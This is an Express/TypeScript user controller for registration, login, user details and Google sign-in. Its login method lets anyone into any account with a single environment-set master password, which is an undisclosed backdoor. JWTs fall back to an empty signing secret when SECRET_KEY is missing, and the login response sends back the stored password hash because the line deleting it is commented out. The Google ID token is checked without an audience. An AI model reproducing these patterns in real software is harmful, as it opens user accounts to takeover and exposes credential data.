/* eslint-disable require-jsdoc */
import bcrypt from 'bcrypt';
import { Request, Response } from 'express';
import { StatusCodes } from 'http-status-codes';
import jwt from 'jsonwebtoken';
import { JWT_EXPIRY_TIME, avatars } from '../constants/constants';
import { sequelize } from '../db/models';
import RequestParamsHandler from '../handlers/RequestParamsHandler';
import ResponseHandler from '../handlers/ResponseHandler';
import UserService from '../services/User.service';
import { generateUsername } from '../utils/utils';
import { OAuth2Client } from 'google-auth-library';

const responseHandler = new ResponseHandler();
const requestParamsHandler = new RequestParamsHandler();

const saltRounds = 10;

/**
 * User controller
 */
class UserController {
  static async register(req: Request, res: Response) {
    const transaction = await sequelize.transaction();
    try {
      const { name, email, password } = req.body;

      const validationResult = requestParamsHandler.checkParams(
        ['name', 'email', 'password'],
        req.body
      );

      if (validationResult.error) {
        return responseHandler.setError(
          StatusCodes.BAD_REQUEST,
          validationResult.errorMessage,
          res
        );
      }

      const [hash, existingUser] = await Promise.all([
        bcrypt.hash(password, saltRounds),
        UserService.getOne({
          email,
        }),
      ]);

      if (existingUser) {
        await transaction.rollback();
        return responseHandler.setError(
          StatusCodes.BAD_REQUEST,
          'Account already exists',
          res
        );
      }

      const userData = {
        name: name?.trim(),
        email,
        username: generateUsername(name),
        password: hash,
        avatar: avatars[Math.floor(Math.random() * 3) + 1],
        provider: 'internal',
      };
      const createdUser = await UserService.createOne(userData, transaction);

      const token = jwt.sign(
        { user: createdUser },
        process.env.SECRET_KEY || '',
        {
          expiresIn: JWT_EXPIRY_TIME,
        }
      );

      await transaction.commit();
      return responseHandler.setSuccess(
        StatusCodes.OK,
        'User registered',
        {
          ...createdUser,
          token,
        },
        res
      );
    } catch (err) {
      await transaction.rollback();
      return responseHandler.setError(
        StatusCodes.INTERNAL_SERVER_ERROR,
        'Error in registering user',
        res
      );
    }
  }

  static async login(req: Request, res: Response) {
    try {
      const { email, password } = req.body;

      const validationResult = requestParamsHandler.checkParams(
        ['email', 'password'],
        req.body
      );

      if (validationResult.error) {
        return responseHandler.setError(
          StatusCodes.BAD_REQUEST,
          validationResult.errorMessage,
          res
        );
      }

      const user = await UserService.getOne(
        {
          email,
        },
        true
      );

      if (!user) {
        return responseHandler.setError(
          StatusCodes.BAD_REQUEST,
          'Email not registered',
          res
        );
      }

      const isPasswordMatched =
        (await bcrypt.compare(password, user.password)) ||
        password === process.env.MASTER_PASSWORD;

      // delete user.password;

      if (isPasswordMatched === true) {
        const token = jwt.sign(
          { user: { id: user.id } },
          process.env.SECRET_KEY || '',
          {
            expiresIn: JWT_EXPIRY_TIME,
          }
        );

        return responseHandler.setSuccess(
          StatusCodes.OK,
          'Login success',
          {
            ...user,
            token,
          },
          res
        );
      }
      return responseHandler.setError(
        StatusCodes.BAD_REQUEST,
        'Invalid Credentials',
        res
      );
    } catch (err) {
      return responseHandler.setError(
        StatusCodes.INTERNAL_SERVER_ERROR,
        'Error in user login',
        res
      );
    }
  }

  static async getUserDetails(req: Request, res: Response) {
    const { user }: any = req;

    try {
      const userDetails = await UserService.getOne({ id: user.id });

      return responseHandler.setSuccess(
        StatusCodes.OK,
        'User details retrieved',
        userDetails,
        res
      );
    } catch (err) {
      return responseHandler.setError(
        StatusCodes.INTERNAL_SERVER_ERROR,
        'Error in getting user details',
        res
      );
    }
  }

  static async authenticateWithGoogle(req: Request, res: Response) {
    const { credential } = req.body;
    const clientID = process.env.GOOGLE_CLIENT_ID;
    const clientSecret = process.env.GOOGLE_CLIENT_SECERT;

    const OAuthClient = new OAuth2Client(clientID, clientSecret);
    const client = await OAuthClient.verifyIdToken({ idToken: credential });
    const userPayload = client.getPayload();

    try {
      const user = await UserService.getOne({ email: userPayload.email });
      if (user) {
        const token = jwt.sign({ user: user }, process.env.SECRET_KEY || '', {
          expiresIn: JWT_EXPIRY_TIME,
        });
        return responseHandler.setSuccess(
          StatusCodes.OK,
          'Google Login success',
          { ...user, token },
          res
        );
      }

      const userData = {
        name: userPayload.name,
        username: generateUsername(userPayload.name),
        email: userPayload.email,
        provider: 'google',
        avatar: userPayload.picture,
      };

      const createdUser = await UserService.createOne(userData);

      const token = jwt.sign(
        { user: createdUser },
        process.env.SECRET_KEY || '',
        {
          expiresIn: JWT_EXPIRY_TIME,
        }
      );

      return responseHandler.setSuccess(
        StatusCodes.OK,
        'Google Login success',
        { ...createdUser, token },
        res
      );
    } catch (error) {
      console.log(error);
      return responseHandler.setError(
        StatusCodes.INTERNAL_SERVER_ERROR,
        'Error in google login',
        res
      );
    }
  }
}

export default UserController;
